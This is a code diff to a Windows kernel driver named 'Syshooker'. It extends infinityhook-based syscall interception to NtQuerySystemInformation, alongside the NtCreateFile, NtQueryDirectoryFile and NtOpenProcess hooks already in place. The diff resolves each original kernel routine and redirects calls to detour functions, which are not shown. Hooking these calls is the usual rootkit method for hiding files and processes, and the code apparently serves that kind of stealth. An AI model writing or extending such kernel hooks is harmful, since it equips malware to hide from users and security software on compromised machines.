@@ -26,6 +26,7 @@
 #include "NtQueryDirectoryFile.h"
 #include "NtQueryDirectoryFileEx.h"
 #include "NtOpenProcess.h"
+#include "NtQuerySystemInformation.h"
 
 UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Syshooker");
 
@@ -55,7 +56,6 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_
 		KdPrint(("Failed to create device object (0x%08X)\n", status));
 		return status;
 	}
-
 	
 	status = IoCreateSymbolicLink(&symLink, &deviceName);
 	if (!NT_SUCCESS(status)) {
@@ -78,7 +78,7 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_
 	DriverObject->DriverUnload = DriverUnload;
 
 	// HERE: find the address of a real syscall
-	// Detour NtCreateFile.
+	// Find the original address of NtCreateFile.
 	OriginalNtCreateFile = (NtCreateFile_t)MmGetSystemRoutineAddress(&StringNtCreateFile);
 	if (!OriginalNtCreateFile)
 	{
@@ -115,6 +115,13 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_
 	if (!OriginalNtOpenProcess)
 	{
 		kprintf("[-] infinityhook: Failed to locate export: %wZ.\n", StringNtOpenProcess);
+		return STATUS_ENTRYPOINT_NOT_FOUND;
+	}
+
+	OriginalNtQuerySystemInformation = (NtQuerySystemInformation_t)MmGetSystemRoutineAddress(&StringNtQuerySystemInformation);
+	if (!OriginalNtQuerySystemInformation)
+	{
+		kprintf("[-] infinityhook: Failed to locate export: %wZ.\n", StringNtQuerySystemInformation);
 		return STATUS_ENTRYPOINT_NOT_FOUND;
 	}
 
@@ -202,6 +209,12 @@ void __fastcall SyscallStub(
 	if (*SystemCallFunction == OriginalNtOpenProcess)
 	{
 		*SystemCallFunction = DetourNtOpenProcess;
+	}
+
+	// NtQuerySystemInformation
+	if (*SystemCallFunction == OriginalNtQuerySystemInformation)
+	{
+		*SystemCallFunction = DetourNtQuerySystemInformation;
 	}
 }
 
